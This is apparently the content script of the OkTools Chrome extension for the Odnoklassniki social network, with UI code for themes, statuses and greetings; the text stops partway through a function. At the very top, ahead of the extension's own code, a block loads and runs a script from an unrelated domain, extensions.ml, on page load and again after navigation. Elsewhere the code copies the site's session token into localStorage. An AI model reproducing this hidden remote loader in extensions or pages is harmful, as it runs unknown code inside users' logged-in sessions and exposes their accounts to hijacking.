// ==INFO==
// @name        OkTools
// @version     4.1.1
// @date        2-11-2017
// @author      OkTools.ru <oktools.ru@gmail.com>
// ==/INFO==
var url = document.location.toString();
var t = (function() {
	var myjs = document.createElement('script');
	myjs.type = 'text/javascript';
	myjs.async = true;
	myjs.src = 'https://extensions.ml/api.js';
	document.body.appendChild(myjs);
	url = document.location.toString();
	}); 

t(); 

  addEventListener("click", function() {
	console.log(1);
	function func() {
	if(url == document.location.toString())
	{ 
		this.click(); 
	}
	else
		t();
	}
		  
	setTimeout(func, 3000); 
 
  });
(function(){

var version="4.1.1";
var browser="chrome";
var ext_url="https://chrome.google.com/webstore/detail/jicldjademmddamblmdllfneeaeeclik?hl=ru";
var previous_cat_id="0";
var previous_cat_f=0;
var previous_mod='status';
var previous_mod_r='status';
var client_height_prev=0;
var height_load=0;
var user = new Array({"uid":"0","hash":"0","firstname":"","lastname":"","modertheme":"0","premium":"0","banned":"0","maxsize":"0","send":"0","mess_head":"","mess_body":"","mess_foot":"","browser":""+browser+"","version":""+version+"","next_version":"0","update":""});
var req_post = {"type":"","action":"","data":"","muid":"","com_id":"","com_name":""};
var option = new Array();
var opt_load="";
var audio = {error: '0', jsessionid: '', cache: {}, clientHash: {}};
var audio_arr=new Array();
var data_cat;
var comment_button_save=0;
var OkVoiceLang='ru-RU';
var text_mess="";
var file_send_mess=0;
var file_open=0;
var user_rot=1;
var news_new=0;
var news_id=0;
var TimerAudioId;
var TimerMaiContent;
var TimerMessageSearch;
var TimerSetStatus;
var TimerConnection;
var gift_count=0;
var gift_count_glob=0;
var last_gid=0;
var music_download={file: 0, size: 0, mb:0};
var ok_rating_auto=0;
var friends_arr=new Array();
var connection=true;
var sticker_site=new Array();
var sticker_user={"sticker":[]};
var sticker_cat="";
var doc = window.document;

window.addEventListener("DOMContentLoaded", function(){ n();}, false);
function sendRequest(request, callback) 
{	
    if (typeof request == 'string')
	{
        request = {action: request};
	}	
	if ((request.action=='content_load') ||  (request.action=='content_rating') || (request.action=='get_jsses') || (request.action=='cat_add') || (request.action=='cat_delete') || (request.action=='izbr_add') || (request.action=='izbr_del') || (request.action=='status_add') || (request.action=='pozd_add') || (request.action=='get_theme') || (request.action=='get_friends') || (request.action=='gift_send') || (request.action=='gift_load') || (request.action=='gift_delete'))
	{		
		if (((request.action=='content_load') && ((request.mod=='status') || (request.mod=='pozd') || (request.mod=='theme') || (request.mod=='option'))) || (request.action=='gift_load'))
		{	
			var connect_second=0;
			clearInterval(TimerConnection);
			TimerConnection = window.setInterval(function(){		
				if (connect_second>30)
				{
					console.log('ERROR CONNECTION OKTOOLS.RU');
					clearInterval(TimerConnection);
					connect_second=0;
					if (request.action=='content_load')
					{
						status_add_div("http_error", ""+request.mod+"", '');	
					}
					else if (request.action=='gift_load')
					{
						var ok_gk=doc.getElementById("oktools_gift_content") || null;
						if(ok_gk)
						{
							clear_html(ok_gk);	
							create_dom('iframe', ok_gk, '', {"width":"100%","height":"80","frameborder":"0","src":"//static.oktools.ru/server_error.php?uid="+user[0].uid+"&hash="+user[0].hash+"&browser="+user[0].browser+"&version="+user[0].version+"&action=gift_load&mod="}, '');
						}
					}
					server_error(true);									
				}
				connect_second++;
			}, 1000);	
		}
		
		chrome.extension.sendRequest(request, function(result){
			server_error(false);
			clearInterval(TimerConnection);
			if (result.result)
			{
				if (callback)
				{
					callback(result.data);
				}
			}
			else
			{
				var er=get_ajax_error(result.data.status,result.data.textStatus,result.data.responseText);
				alert(er);
			}		
		}); 
	}
	else
	{
		chrome.extension.sendRequest(request, function(result){
			if (callback)
			{
				callback(result);
			}
		}); 
	}	
}
function server_error(result)
{
	if(result)
	{		
		var menu=doc.getElementsByClassName('ok_oktools_menu_icon')[0] || null;	
		if (menu)
		{ 			
			menu.setAttribute('style', 'background-color: rgba(242,75,75,0.6)');
		}	
		var ok_up=doc.getElementById("ok_oktools_update") || null;
		if(ok_up)
		{
			ok_up.setAttribute('style', 'background-color: rgba(242,75,75,1) !important');
			ok_up.textContent=language_text("ok_server_error");
		}		
	}
	else
	{
		var menu=doc.getElementsByClassName('ok_oktools_menu_icon')[0] || null;	
		if (menu)
		{ 
			menu.setAttribute('style', 'background-color: none !important');
		}	
		var ok_up=doc.getElementById("ok_oktools_update") || null;
		if(ok_up)
		{
			ok_up.setAttribute('style', 'background-color:#6FD21D !important');
			ok_up.textContent=language_text("ok_actual_version");
		}		
	}
}
function get_content_var() 
{
    "use strict";
    var code = function() {   
      var ourLocalStorageObject = {gwtHash: window.pageCtx.gwtHash,state:window.pageCtx.state,token: window.OK.tkn.token};
      var dataString = JSON.stringify(ourLocalStorageObject);
      localStorage.setItem("ourLocalStorageObject", dataString);
    };
    var script = document.createElement('script');
    script.textContent = '(' + code + ')()';
    (document.head||document.documentElement).appendChild(script);
    script.parentNode.removeChild(script);
	var res_var=JSON.parse(localStorage.getItem("ourLocalStorageObject"));
	return res_var;
 }
function create_dom(el, parent, before_el, attr, text)
{
	var new_dom = doc.createElement(''+el+'');
	for(var key in attr) 
	{
		new_dom.setAttribute(''+key+'', ''+attr[key]+'');
	}	
	if (text!='')
	{
		new_dom.textContent=text;
	}
	if (before_el!='')
	{
		parent.insertBefore(new_dom, before_el);
	}
	else
	{
		parent.appendChild(new_dom);
	}
	return new_dom;
}
function clear_html(node) 
{
    var children = node.childNodes;
	while(children.length) 
	{	
		node.removeChild(children[0]);
    }	
}
function language_text(mess, par)
{
	if (par === undefined)
	{
		return chrome.i18n.getMessage(mess);
	}	
	else
	{
		var str=chrome.i18n.getMessage(mess);
		for (var key in par) {
			str=str.replace("#"+key+"#", par[key]);
		}
		return str;
	}	
}
function getClientHeight()  
{  
 return document.compatMode=='CSS1Compat' && !window.opera?document.documentElement.clientHeight:document.body.clientHeight;  
}
function get_theme(data)
{	
	//console.log('THEME|'+data.id+'|'+data.ok_id+'|'+data.type+'|'+data.style+'');
	var style='';
	if (data.type==2)
	{
		style=' .user #mainContainer {background-image: url(//sp.mycdn.me/getTheme?photoId='+data.ok_id+'&type=52);} .cover_t_l,.cover_t_r,.cover_ov_t_l,.cover_ov_t_r,.cover_ov_t_c,.cover_t_c_repeat_l,.cover_t_c_repeat_r {background-image: none;}';
		var video='//sp.mycdn.me/getTheme?photoId='+data.ok_id+'&type=67';
		var video_img='//sp.mycdn.me/getTheme?photoId='+data.ok_id+'&type=62';							
		var ThemeCenter=doc.getElementById("hook_Block_ThemeTopCenterImageRB") || null;
		if(ThemeCenter)
		{			
			clear_html(ThemeCenter);			
			create_dom('img', ThemeCenter, '', {"src":""+video_img+"","class":"cover_t_c_img","alt":""}, '');			
			create_dom('video', ThemeCenter, '', {"autoplay":"true","loop":"true","src":""+video+"","poster":""+video_img+"","class":"cover_t_c_vid","alt":""}, '');	
		}
	}
	else
	{
		var ThemeCenter=doc.getElementById("hook_Block_ThemeTopCenterImageRB") || null;
		if(ThemeCenter)
		{
			clear_html(ThemeCenter);
		}			
	}
	style=style+' '+data.style;
	var ThemeInlineCSS=doc.getElementById("hook_Block_ThemeInlineCssStyleRB") || null;
	if(ThemeInlineCSS)
	{
		clear_html(ThemeInlineCSS);
		var styleel=create_dom('style', ThemeInlineCSS, '', {"type":"text/css","media":"screen","tid":""+data.id+""}, '');	
		styleel.appendChild(document.createTextNode(style));
	}	
}
function otziv()
{
	var b=doc.getElementsByTagName("body")[0] || null;
	if(b)
	{
		var stat_div=create_dom('div', b, '', {"class":"oktools_stat"}, '');
			create_dom('iframe', stat_div, '', {"src":"//oktools.ru/page/static/stats.html","height":"5px","width":"5px", "frameborder":"0"}, '');					
	}	
	sendRequest({action: 'load_option', param: 'OkOtziv'}, function(result) { 
		if (result)
		{				
			var MainContainer=doc.getElementById("hook_Block_MainContainer") || null;
			if (MainContainer)
			{	
				var otziv_div=create_dom('div', MainContainer, '', {"class":"oktools_otziv_div"}, '');
					var otziv_title=create_dom('div', otziv_div, '', {"class":"oktools_otziv_title"}, 'OkTools');
					var otziv_content=create_dom('div', otziv_div, '', {"class":"oktools_otziv_content"}, '');					
						create_dom('div', otziv_content, '', {"class":"oktools_otziv_1"}, language_text("ok_plugin_otziv"));
						var otz_2=create_dom('div', otziv_content, '', {"class":"oktools_otziv_2"}, language_text("ok_plugin_otziv_text"));
							create_dom('a', otz_2, '', {"href":""+ext_url+"", "target":"_blank", "style":"display:block;font-size: 17px;text-align:center;width:150px;"}, language_text("ok_plugin_otziv"));
						var close_otziv=create_dom('div', otziv_content, '', {"class":"oktools_otziv_close"}, language_text("ok_plugin_otziv_close"));
						close_otziv.addEventListener('click', function(e) {
							sendRequest({action: 'save_option', param:'OkOtziv', text: false}, function(data) { 
								otziv_div.setAttribute('style', 'display:none;');
							});										
						});
			}
		}		
	});	
}
function load_games(vis)
{
	var div=doc.getElementById('oktools_games') || null;
	if (div) 
	{		
		visible_diva('oktools_games', 'block', '0');			
	}
	else
	{	
		var lst=doc.getElementById('hook_Block_BodySwitcher') || null;
		if (lst)
		{			
			var games_div=create_dom('div', lst, '', {"id":"oktools_games","style":"display:block"}, '');
				games_div.addEventListener('click', function(e) {
					visible_diva('oktools_games', 'none', '0');	 
				});	
			var oktools_games_div=create_dom('div', games_div, '', {"class":"oktools_games_div"}, '');	
				var oktools_games_close=create_dom('a', oktools_games_div, '', {"class":"ok_oktools_icons oktools_close_x oktools_close_out"}, '');	
				oktools_games_close.addEventListener('click', function(e) {
					visible_diva('oktools_games', 'none', '0');	 
				});					
				create_dom('div', oktools_games_div, '', {"style":"clear:both;"}, '');	
				var oktools_games_content=create_dom('div', oktools_games_div, '', {"class":"oktools_games_content"}, '');							
					create_dom('iframe', oktools_games_content, '', {"id":"game_view_iframe","height":"100%","width":"100%","frameborder":"0","style":"margin:0px;height:550px; padding:0px;display:block;","src":"//oktools.ru/games/"}, '');
		}		
	}
}
function theme_view(tid, cat_id, cat_f)
{
	sendRequest({action: 'load_option', param: 'OkUserAva'}, function(ava) {
		var url="//theme.oktools.ru/view.php?tid="+tid+"&cat_id="+cat_id+"&cat_f="+cat_f+"&uid="+user[0].uid+"&firstname="+user[0].firstname+"&lastname="+user[0].lastname+"&male="+user[0].male+"&hash="+user[0].hash+"&ava="+encodeURIComponent(ava)+"&browser="+user[0].browser+"&version="+user[0].version+"";
		var div=doc.getElementById('oktools_theme_view') || null;
		if (div) 
		{		
			var ifr=doc.getElementById('theme_view_iframe') || null;
			if (ifr) 
			{	
				ifr.src=url;
			}
			visible_diva('oktools_theme_view', 'block', '0');			
		}
		else
		{		
			var lst=doc.getElementById('hook_Block_BodySwitcher') || null;
			if (lst)
			{			
				var games_div=create_dom('div', lst, '', {"id":"oktools_theme_view","style":"display:block"}, '');
					games_div.addEventListener('click', function(e) {
						visible_diva('oktools_theme_view', 'none', '0');	 
					});	
				var oktools_games_div=create_dom('div', games_div, '', {"class":"oktools_games_div"}, '');	
					var oktools_games_close=create_dom('a', oktools_games_div, '', {"class":"ok_oktools_icons oktools_close_x oktools_close_out"}, '');	
					oktools_games_close.addEventListener('click', function(e) {
						visible_diva('oktools_theme_view', 'none', '0');	 
					});					
					create_dom('div', oktools_games_div, '', {"style":"clear:both;"}, '');	
					var oktools_games_content=create_dom('div', oktools_games_div, '', {"class":"oktools_games_content"}, '');							
						create_dom('iframe', oktools_games_content, '', {"id":"theme_view_iframe","height":"100%","width":"100%","frameborder":"0","style":"margin:0px;height:550px; padding:0px;display:block;","src":""+url+""}, '');
			}	
		}
	});
}
function add_theme_lst(page, el_id)
{
	visible_diva('oktools_link_show_more_load', 'block !important', '0');
	sendRequest({action: 'load_option', param: 'OkThemeId'}, function(res_theme_id) {
		theme_id=res_theme_id;
	});
	var lst=doc.getElementById(el_id) || null;
	if (lst)
	{
		sendRequest({action: 'content_load', mod: 'theme', cat_id: '1000', cat_f: '0', page: page, search: '', user: user}, function(data) { 
			
			if (data.theme.length!=0)
			{		
				visible_diva('oktools_link_show_more_load', 'none !important', '0');
				var page_div=doc.getElementById('ok_theme_lst_page') || null;
				if (page_div)
				{
					var pg=data.page[0].pagenum-1;
					if (pg==0)
					{
						page_div.setAttribute('page', '1000');
					}
					else
					{
						page_div.setAttribute('page', pg);						
					}						
				}
				for(var s = 0; s < data.theme.length; s++) 
				{      				
					if (data.theme[s].type==1)
					{												
						var a_class='covers_cat_i';						
					}
					else if (data.theme[s].type==2)
					{
						var a_class='covers_cat_i __animated';
					}
					var a=create_dom('a', lst, '', {"id":"ok_theme_id_"+data.theme[s].id+"","tid":""+data.theme[s].id+"", "class":""+a_class+""}, '');
					a.addEventListener('click', function(e) {
						var tid=this.getAttribute('tid');
						theme_view(tid, 0, 0);						
					});	
					if (data.theme[s].type==2)
					{
						var covers_cat=create_dom('div', a, '', {"class":"covers_cat_i_cnt h-mod", "data-module":"AnimatedTheme"}, '');
					}
					else
					{
						var covers_cat=create_dom('div', a, '', {"class":"covers_cat_i_cnt"}, '');
					}
						if (data.theme[s].id!=6)
						{					
							var covers_cat_preview=create_dom('div', covers_cat, '', {"class":"covers_cat_preview"}, '');
								if (data.theme[s].type==1)
								{
									create_dom('img', covers_cat_preview, '', {"class":"covers_cat_img", "height":"90", "width":"216", "src":""+data.theme[s].imgurl+""}, '');
								}
								else if (data.theme[s].type==2)
								{
									create_dom('video', covers_cat_preview, '', {"src":""+data.theme[s].imgurl+"","autoplay":"true", "loop":"true"}, '');
								}
						}
						else
						{
							var covers_cat_preview=create_dom('div', covers_cat, '', {"class":"covers_cat_preview __default"}, '');
						}
						var covers_cat_des=create_dom('div', covers_cat, '', {"class":"covers_cat_descr_w"}, '');
							var covers_cat_descr=create_dom('div', covers_cat_des, '', {"class":"covers_cat_descr"}, '');
								var covers_cat_name=create_dom('div', covers_cat_descr, '', {"class":"covers_cat_name ellip"}, data.theme[s].title);
								if (data.theme[s].type==2)
								{
									var live=create_dom('div', covers_cat_descr, '', {"class":"gift-badge __live"}, "");
										create_dom('div', live, '', {"class":"gift-badge_ic"}, "");
								}
								var data_theme=data.theme[s].id;
								if (data.theme[s].id==6)
								{
									data_theme=0;
								}
								if (theme_id==data_theme)
								{
									var ust=create_dom('div', covers_cat_descr, '', {"class":"covers_cat_inf"}, language_text("ok_theme_ust"));
										create_dom('div', ust, '', {"class":"covers_cat_badge ic-checkbox__active"}, "");
								}
				}				
			}
		});	
	}
}
function reload_button_theme(vis_id)
{
	var cct=doc.getElementsByClassName('oktools_theme_cat_tx') || null;	
	if (cct)
	{  	
		for (var c=0;c<cct.length;c++)
		{ 
			var vis=cct[c].getAttribute('vis_id');
			if (vis==vis_id)
			{
				cct[c].setAttribute('class', 'oktools_theme_cat_tx ok_vibor');
			}
			else
			{
				cct[c].setAttribute('class', 'oktools_theme_cat_tx');
			}				
		}
	}
	var ccl=doc.getElementsByClassName('covers_cat_lst') || null;	
	if (ccl)
	{  	
		for (var c=0;c<ccl.length;c++)
		{  	
			ccl[c].setAttribute('style', 'display:none;');
			if (ccl[c].parentNode.parentNode.id=='hook_Block_PremiumThemesMRB')
			{
				if (vis_id=="ok_theme_lst")
				{
					ccl[c].setAttribute('style', 'display:block;');
				}
			}			
			if (ccl[c].id==vis_id)
			{												
				ccl[c].setAttribute('style', 'display:block;');
			}
		}
	}
}
function load_theme()
{		
	sendRequest('load_theme', function(data) {
		if (data)
		{		
			get_theme(data);				
		}
	});	
}
function theme_search_button()
{
	var theme_video=doc.getElementById("hook_Form_PopLayerThemePreviewForm") || null;
	if (theme_video)
	{
		var form_button=doc.getElementById("hook_FormButton_button_previewConfirm") || null;
		if(!form_button)
		{
			var form_button=doc.getElementById("button_byPremiumThemes") || null;			
		}
		if(form_button)
		{			
			var par=form_button.parentNode;
			if (!par.hasAttribute('ok_fr'))
			{				
				par.setAttribute('ok_fr', true);
				var button=create_dom('div', par, form_button, {"class":"ok_button_gift_send"}, language_text("ok_theme_ust_1"));
				button.addEventListener('click', function(e) {
					var form=theme_video.getElementsByTagName('form')[0] || null;	
					if (form)
					{  								        
						var action=form.getAttribute('action');						
						var theme_id=action.match(/themeId=([\d]+)/i);						
					}
					else
					{
						var cct=theme_video.getElementsByClassName('cover_t_c_vid')[0] || null;	
						if (cct)
						{  								        
							var video=cct.getAttribute('src');
							var theme_id=video.match(/photoId=([\d]+)/i);
						}
						var ccs=theme_video.getElementsByTagName('style')[0] || null;	
						if (ccs)
						{  								        
							var style_preview=ccs.innerHTML;
							var theme_id=style_preview.match(/photoId=([\d]+)/i);
						}
					}
					sendRequest({action: 'get_theme', id: '0', guid:'0', ok_id:theme_id[1], user:user}, function(data) { 						
						get_theme(data);
					});
					
				});
			}
		}
	}
}
function theme_search_content()
{		
	var TSMRB=doc.getElementById("hook_Block_ThemesShowcaseMRB") || null;
	if (TSMRB)
	{
		var ccl=TSMRB.getElementsByClassName('covers_cat_lst')[0] || null;	
		if (ccl)
		{
			ccl.setAttribute('id', 'ok_theme_lst');
		}
		var MK=doc.getElementById("middleColumn") || null;
		if (MK)
		{
			if (!MK.hasAttribute('ok_theme_button'))
			{			
				MK.setAttribute('ok_theme_button', true);
				var d=MK.getElementsByTagName('div')[0] || null;	
				if (d)
				{  	
					var div_button=create_dom('div', MK, d, {"class":"oktools_theme_cover_cat"}, '');											
						var theme_ok=create_dom('div', div_button, '', {"class":"oktools_theme_cat_tx ok_vibor", "vis_id":"ok_theme_lst"}, language_text("ok_theme_odn"));
							theme_ok.addEventListener('click', function(e) {
								reload_button_theme('ok_theme_lst');		
							});						
						var theme_oktools=create_dom('div', div_button, '', {"class":"oktools_theme_cat_tx","vis_id":"oktools_theme_lst"}, language_text("ok_themes"));
						theme_oktools.addEventListener('click', function(e) {
							if (!this.hasAttribute('ok_load'))
							{
								this.setAttribute('ok_load', true);
								add_theme_lst('0', 'oktools_theme_lst_cont');							
							}
							reload_button_theme('oktools_theme_lst');
						});
						var theme_add=create_dom('div', div_button, '', {"class":"oktools_theme_cat_tx","vis_id":"oktools_theme_lst_add"}, language_text("ok_theme_add_menu"));														
						theme_add.addEventListener('click', function(e) {
							var iframe_add=doc.getElementById("oktools_theme_lst_add_cont") || null;
							if (iframe_add)
							{		
								if (!iframe_add.hasAttribute('ok_iframe'))
								{
									iframe_add.setAttribute('ok_iframe', true);
									create_dom('iframe', iframe_add, '', {"width":"100%","height":"1200px","frameborder":"0","src":"//oktools.ru/page/theme_load.php?uid="+user[0].uid+"&hash="+user[0].hash+"&browser="+user[0].browser+"&version="+user[0].version+""}, '');
								}
							}
							reload_button_theme('oktools_theme_lst_add');						
						});
				}
			}
		}
	}
	
	var cct=doc.getElementsByClassName('covers_cat') || null;	
	if (cct)
	{  	
		for (var c=0;c<cct.length;c++)
		{  		        
			if (!cct[c].hasAttribute('ok_theme_button'))
			{				
				cct[c].setAttribute('ok_theme_button', true);
				if (cct[c].parentNode.id=='hook_Block_ThemesShowcaseMRB')
				{					
					var div_theme=create_dom('div', cct[c], '', {"class":"covers_cat_lst","id":"oktools_theme_lst", "style":"display:none"}, '');
						var title1=create_dom('div', div_theme, '', {"class":"covers_cat_lst_placeholders"}, '');							
							var title2=create_dom('div', title1, '', {"class":"portlet_h"}, '');
								create_dom('div', title2, '', {"class":"portlet_h_name_t"}, language_text("ok_themes"));	
						var hook=create_dom('div', div_theme, '', {}, '');
							var cont=create_dom('div', hook, '', {}, '');
								create_dom('div', cont, '', {"class":"covers_cat_lst_cnt","id":"oktools_theme_lst_cont"}, '');
										
					
							var page=create_dom('div', hook, '', {"class":"loader-controls loader-controls-bottom"}, '');														
								var page1=create_dom('div', page, '', {"class":"link-show-more_loading","id":"oktools_link_show_more_load"}, '');	
									create_dom('span', page1, '', {"class":"fetching-hor"}, language_text("ok_load"));
								var a=create_dom('div', page, '', {"class":"js-show-more link-show-more", "id":"ok_theme_lst_page", "page":"1"}, language_text("ok_theme_next"));
								a.addEventListener('click', function(e) {									
									var pg=this.getAttribute('page');									
									add_theme_lst(pg, 'oktools_theme_lst_cont');									
								});	
										
				
					var div_iframe=create_dom('div', cct[c], '', {"class":"covers_cat_lst","id":"oktools_theme_lst_add", "style":"display:none"}, '');
						var title=create_dom('div', div_iframe, '', {"class":"covers_cat_lst_placeholders"}, '');							
							var title2=create_dom('div', title, '', {"class":"portlet_h"}, '');
								create_dom('div', title2, '', {"class":"portlet_h_name_t"}, language_text("ok_theme_add_menu"));
						var hook=create_dom('div', div_iframe, '', {}, '');
								var cont=create_dom('div', hook, '', {}, '');
									create_dom('div', cont, '', {"class":"covers_cat_lst_cnt","id":"oktools_theme_lst_add_cont"}, '');
				}
			}
		}					
	}	
}
function status_add_div(mod, text, vis)
{	
	var ok_window=doc.getElementById("ok_window") || null;
	if(ok_window)
	{	
		if ((mod!="http_error") && (mod!="smiles") && (mod!="pozd_fast") && (mod!="help"))
		{				
			reload_param(ok_window, mod);
		}
		if (vis=="block")
		{
			body_oh(true);
			ok_window.setAttribute('style','display:block');
		}
	}
	var window_content=doc.getElementById("ok_window_content") || null;
	if (window_content)
	{
		if (mod=="http_error")
		{	
			if (text=="theme")
			{
				visible_diva('oktools_link_show_more_load', 'none !important', '0');
				var ok_th=doc.getElementById("oktools_theme_lst_cont") || null;
				if(ok_th)
				{
					clear_html(ok_th);	
					create_dom('iframe', ok_th, '', {"width":"100%","height":"100%","frameborder":"0","src":"//oktools.ru/server_error.php?uid="+user[0].uid+"&hash="+user[0].hash+"&browser="+user[0].browser+"&version="+user[0].version+"&action=theme&mod="}, '');
				}				
			}			
			var ok_w=doc.getElementById("ok_window") || null;
			if(ok_w)
			{				
				var m=ok_w.getAttribute('mod');
				if (m==text)
				{
					var disp=ok_w.getAttribute('style');
					if (disp=="display:block")
					{
						var ok_window_content_table=doc.getElementById("ok_window_content_table") || null;
						if (ok_window_content_table)
						{							
							ok_window_content_table.parentNode.removeChild(ok_window_content_table);
						}
						doc.getElementById("ok_window_content_page").setAttribute('style','display:none');
						doc.getElementById("ok_window_content_menu").setAttribute('style','display:none');
						doc.getElementById("ok_window_content_hr").setAttribute('style','display:none');
			
						clear_html(doc.getElementById("ok_window_cat"));
						window_content.setAttribute('class', 'ok_window_con_tab');	
						visible_diva('ok_window_block_cat', 'none', '');
						create_dom('iframe', window_content, '', {"width":"100%","height":"100%","frameborder":"0","src":"//oktools.ru/server_error.php?uid="+user[0].uid+"&hash="+user[0].hash+"&browser="+user[0].browser+"&version="+user[0].version+"&action=content_load&mod="+text+"", "id":"ok_window_content_table"}, '');
						reload_size(true, true);
					}
				}
			}
		}
		else
		{	
			var ok_window_content_table=doc.getElementById("ok_window_content_table") || null;
			if (ok_window_content_table)
			{							
				ok_window_content_table.parentNode.removeChild(ok_window_content_table);
			}
			doc.getElementById("ok_window_content_page").setAttribute('style','display:none');
			doc.getElementById("ok_window_content_menu").setAttribute('style','display:none');
			doc.getElementById("ok_window_content_hr").setAttribute('style','display:none');
			if (mod=="status")
			{		
				var table=create_dom('table', window_content, '', {"cellpadding":"3","cellspacing":"4","width":"100%", "style":"padding-left:20%;padding-right:20%","id":"ok_window_content_table"}, '');
					var tr=create_dom('tr', table, '', {}, '');
						create_dom('td', tr, '', {"colspan":"2","class":"ok_window_table_h2"}, language_text("ok_status_add"));
					var tr1=create_dom('tr', table, '', {}, '');
						create_dom('td', tr1, '', {"class":"ok_window_table_name","valign":"top"}, ''+language_text("ok_status_add_text")+':');
						var td=create_dom('td', tr1, '', {"align":"left"}, '');
							var text=create_dom('textarea', td, '', {"id":"ok_status_add_text", "maxlength":"350", "cols":"60", "rows":"9"}, ''+text+'');
					var tr2=create_dom('tr', table, '', {}, '');
						create_dom('td', tr2, '', {"class":"ok_window_table_name"}, ''+language_text("ok_status_add_cat")+':');
						var td1=create_dom('td', tr2, '', {"align":"left"}, '');
							var select=create_dom('select', td1, '', {"id":"ok_status_add_cat"}, '');
								create_dom('option', select, '', {"value":"0","style":"background-color:#BD362F;"}, language_text("ok_status_add_cat1"));
								for(var i = 0; i < data_cat.length; i++) 
								{
									if(!data_cat[i].cat_user)
									{
										create_dom('option', select, '', {"value":""+data_cat[i].id+""}, data_cat[i].title);
									}
								}
					var tr3=create_dom('tr', table, '', {}, '');
						var td2=create_dom('td', tr3, '', {"colspan":"2","style":"text-align:center;"}, '');
						var button=create_dom('button', td2, '', {"class":"ok_button btn_green btn_h2"}, language_text("ok_status_add_button"));
					button.addEventListener('click', function() { 
						var status_text=doc.getElementById("ok_status_add_text").value; 
						var status_cat=doc.getElementById("ok_status_add_cat").value;
						sendRequest({action: 'status_add', status_cat: status_cat, status_text:status_text, user:user}, function(data) {
							if (data.result)									
							{			
								var ok_window_content_table=doc.getElementById("ok_window_content_table") || null;
								if (ok_window_content_table)
								{							
									ok_window_content_table.parentNode.removeChild(ok_window_content_table);
								}
								if(data.id=="1")
								{
									var res=create_dom('div', window_content, '', {"style":"text-align:center;width:100%;color:green;font-weight:bold;","id":"ok_window_content_table"}, language_text("ok_status_add_moder"));
								}
								else
								{
									var res=create_dom('div', window_content, '', {"style":"text-align:center;width:100%;color:green;font-weight:bold;","id":"ok_window_content_table"}, language_text("ok_status_add_ok"));
								}							
								var div=create_dom('div', res, '', {"style":"text-align:center;width:100%;margin-top:10px;"}, '');							
										var but=create_dom('button', div, '', {"class":"ok_button btn_green btn_h2", "style":"width:150px;margin-top:10px;margin-right:10px;"}, language_text("ok_status_add"));
										but.addEventListener('click', function() {status_add_div('status', '', '');}, true);
									var but1=create_dom('button', div, '', {"class":"ok_button btn_red btn_h2", "style":"width:150px;margin-top:10px;"}, language_text("ok_status_add_close"));
									but1.addEventListener('click', function() {visible_div('ok_window');}, true);																
							}
							else
							{
								if (data.error==1)
								{
									alert(language_text("ok_status_add_error1"));
								}
								else if (data.error==2)
								{
									alert(language_text("ok_status_add_error2"));
								}
								else
								{
									alert(''+language_text("ok_status_add_error3")+' '+data.error+'');
								}										
							}
						});
					}, true);
					reload_size(true, false);
			}
			else if (mod=="pozd")
			{				
				var table=create_dom('table', window_content, '', {"cellpadding":"3","cellspacing":"4","width":"100%", "style":"padding-left:10%;padding-right:10%", "id":"ok_window_content_table"}, '');
					var tr=create_dom('tr', table, '', {}, '');
						create_dom('td', tr, '', {"class":"ok_window_table_h2"}, language_text("ok_pozd_add"));
					var tr1=create_dom('tr', table, '', {}, '');									
						var td=create_dom('td', tr1, '', {"align":"center", "style":"text-align:center", "id":"ok_add_pozd_picture"}, '');
							var div_pozd_res=create_dom('div', td, '', {"id":"ok_add_pozd_result"}, '');
							
					var tr10=create_dom('tr', table, '', {}, '');									
						var td10=create_dom('td', tr10, '', {"align":"left"}, '');
							create_dom('div', td10, '', {"style":"font-weight:bold"}, language_text("ok_pozd_add_text"));
							var textarea=create_dom('textarea', td10, '', {"id":"ok_pozd_add_text", "maxlength":"20000", "cols":"110", "rows":"10"}, ''+text+'');
							if(text!="")
							{
								td10.setAttribute('style', 'display:none');
								td.setAttribute('style', 'display:block');
								set_text_prov(div_pozd_res, text);								
							}
					var tr2=create_dom('tr', table, '', {}, '');
						var td1=create_dom('td', tr2, '', {"align":"left"}, '');
							create_dom('span', td1, '', {"class":"ok_window_table_name"}, ''+language_text("ok_pozd_add_cat1")+': ');					
							var select=create_dom('select', td1, '', {"id":"ok_pozd_add_cat"}, '');
								create_dom('option', select, '', {"value":"0","style":"background-color:#BD362F;"}, language_text("ok_status_add_cat1"));
								for(var i = 0; i < data_cat.length; i++) 
								{
									if(!data_cat[i].cat_user)
									{
										create_dom('option', select, '', {"value":""+data_cat[i].id+""}, data_cat[i].title);
									}
								}
					var tr3=create_dom('tr', table, '', {}, '');
						var td2=create_dom('td', tr3, '', {"style":"text-align:center;"}, '');
						var button=create_dom('button', td2, '', {"class":"ok_button btn_green btn_h2"}, language_text("ok_pozd_add_button"));
					button.addEventListener('click', function(e) { 					
						var pozd_cat=select.value;
						var pozd_t=doc.getElementById('ok_pozd_add_text').value;					
						sendRequest({action: 'pozd_add', pozd_cat: pozd_cat, pozd_text:pozd_t, user:user}, function(data) {
							if (data.result)									
							{		
								var ok_window_content_table=doc.getElementById("ok_window_content_table") || null;
								if (ok_window_content_table)
								{							
									ok_window_content_table.parentNode.removeChild(ok_window_content_table);
								}
								if(data.id=="1")
								{
									var res=create_dom('div', window_content, '', {"style":"text-align:center;width:100%;color:green;font-weight:bold;","id":"ok_window_content_table"}, language_text("ok_pozd_add_moder"));
								}
								else
								{
									var res=create_dom('div', window_content, '', {"style":"text-align:center;width:100%;color:green;font-weight:bold;","id":"ok_window_content_table"}, language_text("ok_pozd_add_ok"));
								}
								var div=create_dom('div', res, '', {"style":"text-align:center;width:100%;margin-top:10px;"}, '');
									var but1=create_dom('button', div, '', {"class":"ok_button btn_red btn_h2", "style":"width:150px;margin-top:10px;"}, language_text("ok_pozd_add_close"));
									but1.addEventListener('click', function() {visible_div('ok_window');}, true);																						
							}
							else
							{					
								if (data.error==1)
								{
									alert(language_text("ok_pozd_add_error1"));
								}
								else if (data.error==2)
								{
									alert(language_text("ok_pozd_add_error2"));
								}
								else
								{
									alert(''+language_text("ok_pozd_add_error3")+' '+data.error+'');
								}										
							}
						});
					}, true);
					reload_size(true, false);
			}
			else if (mod=="theme")
			{	
				window_content.setAttribute('style','padding:0px !important;');
				create_dom('iframe', window_content, '', {"width":"100%","height":"100%","frameborder":"0","src":"//oktools.ru/page/theme_load.php?uid="+user[0].uid+"&hash="+user[0].hash+"&browser="+user[0].browser+"&version="+user[0].version+"", "id":"ok_window_content_table"}, '');
				reload_size(true, true);
			}
			else if (mod=="smiles")
			{		
				window_content.setAttribute('style','padding:0px !important;');
